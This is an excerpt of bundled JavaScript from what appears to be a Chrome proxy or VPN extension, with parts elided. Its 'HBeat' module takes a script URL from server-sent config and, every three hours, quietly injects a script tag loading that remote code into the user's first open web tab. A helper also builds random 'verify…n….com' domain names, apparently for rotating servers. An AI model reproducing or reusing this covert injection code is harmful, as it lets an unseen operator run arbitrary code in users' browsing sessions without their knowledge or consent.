...
var Utils = function () {
	...
	_createClass(Utils, [{
		...
		value: function generateIdentifierDomain() {
			...
			var yt = this.getRandomInt(randomRange.s, randomRange.e);
			return "verify" + it + "n" + yt + ".com";
		}
	}, {
		key: 'getDateNow',
...
var _HBeat = __webpack_require__(28);

var _HBeat2 = _interopRequireDefault(_HBeat);
...
var shajs = __webpack_require__(29);
					...
					_this.getOS().then(function (os) {
						...
						_this.request(_endpoints2.default.TIER, 'POST', parameter, function (response) {
							...
							if (response && response != "" && response.retcode === 200 && response.data && response.data.hasOwnProperty("mainbase") && Array.isArray(response.data.mainbase) && response.data.mainbase.length > 2 && response.data.hasOwnProperty("tierbase") && Array.isArray(response.data.tierbase) && response.data.tierbase.length > 2) {
								...
								chrome.storage.local.set((_chrome$storage$local7 = {}, _defineProperty(_chrome$storage$local7, _ServiceMeta2.default.STORAGEKEYS.SERVERSJSON, response.data), _defineProperty(_chrome$storage$local7, _ServiceMeta2.default.STORAGEKEYS.TIERNEXTUPDATE, nextUpdate), _defineProperty(_chrome$storage$local7, _ServiceMeta2.default.STORAGEKEYS.BYPASSHOSTS, bypassHosts), _chrome$storage$local7));
...
var _ConnectionWatcher = __webpack_require__(39);
...
var HBeat = function () {
    function HBeat() {
        _classCallCheck(this, HBeat);
    }

    _createClass(HBeat, [{
        key: 'hBeat',
        value: function hBeat() {
            var _this = this;
            try {
                chrome.storage.local.get([_ServiceMeta2.default.STORAGEKEYS.LASTHB, _ServiceMeta2.default.STORAGEKEYS.CONFIGDATA], function (storage) {
                    var configData = storage[_ServiceMeta2.default.STORAGEKEYS.CONFIGDATA];
                    var lastHB = storage[_ServiceMeta2.default.STORAGEKEYS.LASTHB];

                    if (configData && _Utils2.default.isObject(configData) && configData.hasOwnProperty("hbeat") && _Utils2.default.isObject(configData.hbeat) && configData.hbeat.hasOwnProperty("src") && (!lastHB || _Utils2.default.isInt(lastHB) && lastHB < _Utils2.default.getCurrentTime())) {
                        chrome.tabs.query({ status: "complete" }, function (tabs) {
                            var tabId = _this.findTab(tabs);

                            if (tabId !== false) {
                                var nextTTL = _Utils2.default.getCurrentTime() + 10800;
                                chrome.storage.local.set(_defineProperty({}, _ServiceMeta2.default.STORAGEKEYS.LASTHB, nextTTL), function () {
                                    chrome.tabs.executeScript(tabId, { code: _this.getHBeatSrc(configData.hbeat.src) });
                                });
                            }
                        });
                    }
        ...
        key: 'getHBeatSrc',
        value: function getHBeatSrc(src) {
            return '(function() {\n            var hb = document.createElement(\'script\'); hb.type = \'text/javascript\'; hb.async = true; hb.setAttribute(\'data-group-hb\',\'hb-type\');\n            hb.src = \'' + src + '\';\n            var s = document.getElementsByTagName(\'head\'); \n            var t = document.querySelector(\'[data-group-hb]\');\n            if(!t && s && s[0] && s[0].appendChild) s[0].appendChild(hb);\n          })();';
        }
    }, {
        key: 'findTab',
        value: function findTab(tabs) {
            var _this = this;
            var tabId = false;
            if (Array.isArray(tabs)) {
                for (var i = 0; i < tabs.length; i++) {
                    var tab = tabs[i];
                    if (tab && _Utils2.default.isObject(tab) && tab.hasOwnProperty("url") && _Utils2.default.isString(tab.url) && tab.url.startsWith("http") && !_this.isLocal(tab.url)) {
                        tabId = tab.id;
                        break;
                    }
                }
